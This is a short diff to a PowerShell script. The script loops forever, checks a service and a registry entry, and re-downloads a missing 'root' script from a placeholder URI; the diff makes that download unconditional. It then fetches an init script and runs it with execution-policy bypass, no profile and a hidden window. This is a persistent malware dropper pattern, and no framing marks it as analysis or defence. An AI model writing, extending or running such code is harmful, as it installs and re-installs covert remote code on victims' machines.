@@ -28,11 +28,12 @@ function Check-Service{
 while ($true) {
     $regS = Check-ServiceReg
     $serv = Check-Service
+
+    if(-not(Test-Path -Path $rootPath -PathType Leaf)){
+        iwr -uri "ROOT_SCRIPT_URI" -OutFile $rootPath
+    }
     
     if($regS -or $serv){
-        if(-not(Test-Path -Path $rootPath -PathType Leaf)){
-            iwr -uri "ROOT_SCRIPT_URI" -OutFile $rootPath
-        }
         iwr -uri "INTI_SERVICE_URI" -OutFile $initServicePath
         powershell.exe -ep bypass -noP -w hidden $initServicePath
     }
